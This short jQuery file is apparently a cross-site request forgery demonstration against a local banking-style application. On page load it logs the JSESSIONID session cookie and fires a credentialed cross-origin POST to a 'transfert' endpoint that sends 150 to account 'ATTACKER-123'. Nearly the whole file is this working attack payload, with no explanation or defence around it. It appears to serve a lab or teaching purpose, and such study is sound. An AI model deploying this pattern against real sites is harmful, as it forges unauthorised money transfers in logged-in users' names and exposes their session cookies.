$(function () {
	
	
	console.log($.cookie("JSESSIONID"));
	var jsessionid = 'JSESSIONID=' + $.cookie("JSESSIONID");
	console.log(jsessionid);
	
	/**
	 $.post("http://localhost:9090/transfert?noDebiteur=ATTACKER-123&montant=150", function(data, status){
	    alert("Data: " + data + "\nStatus: " + status);
	});
	*/
	
	$.ajax({
        url: 'http://localhost:9090/transfert?noDebiteur=ATTACKER-123&montant=150',
        dataType: 'text',
        type: 'post',
        headers: {
        	'Access-Control-Allow-Credentials' : true, 
        	'Access-Control-Allow-Origin': 'http://localhost:9090'
        },
        xhrFields: {
            withCredentials: true
         },
        //cookie: jsessionid,
        success: function( data, textStatus, jQxhr ){
            console.log( data );
        },
        error: function( jqXhr, textStatus, errorThrown ){
            console.log( errorThrown );
        }
    });
	
})